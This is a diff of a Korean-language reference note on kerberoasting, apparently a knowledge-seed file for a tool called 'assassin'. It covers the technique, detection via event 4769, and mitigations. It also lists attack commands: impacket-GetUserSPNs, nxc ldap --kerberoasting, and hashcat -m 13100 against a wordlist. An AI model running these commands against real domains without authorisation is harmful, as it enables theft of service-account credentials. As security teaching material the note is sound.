@@ -1,7 +1,26 @@
-# 학습 시드: kerberoasting (큐레이션 요약)
+# 학습 시드(심화): kerberoasting
 
-> 사전 심은 큐레이션 개념 요약(확립된 보안 지식). 라이브 수집 아님 — 권위 출처에서 검증 가능. 최신 본문은 `assassin --learn kerberoasting` 로 갱신.
+> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn kerberoasting`. P1: 머신별 라이트업 미참조.
 
-SPN이 설정된 도메인 서비스 계정의 TGS-REP 티켓을 요청해 그 암호화 블록(계정 비밀번호 파생 키)을 오프라인 크랙한다(hashcat -m 13100). 도메인 사용자 인증만 있으면 가능. 탐지: 4769 급증·RC4 요청. 완화: 긴 랜덤 gMSA, AES 강제.
+## 개요
+Kerberoasting(T1558.003): SPN 보유 서비스계정의 TGS 를 요청해 오프라인 크랙.
+
+## 핵심 기법 · 열거
+- 인증된 도메인 사용자면 누구나 TGS 요청 가능
+- RC4 TGS → hashcat 13100
+- 약한 서비스계정 암호가 핵심 취약
+
+## 표준 도구 · 명령
+```
+impacket-GetUserSPNs <domain>/user:pass -dc-ip <dc> -request
+nxc ldap <dc> -u user -p pass --kerberoasting out.txt
+hashcat -m 13100 tgs.txt rockyou.txt
+```
+
+## 블루팀 탐지
+4769 다수 SPN TGS 요청(단일 계정)·RC4 etype 선호·비정상 서비스티켓 폭증.
+
+## 완화
+서비스계정 25자+ 랜덤 암호·gMSA·AES 강제·SPN 최소화·4769 모니터링.
 
 - 출처(검증): https://attack.mitre.org/techniques/T1558/003/
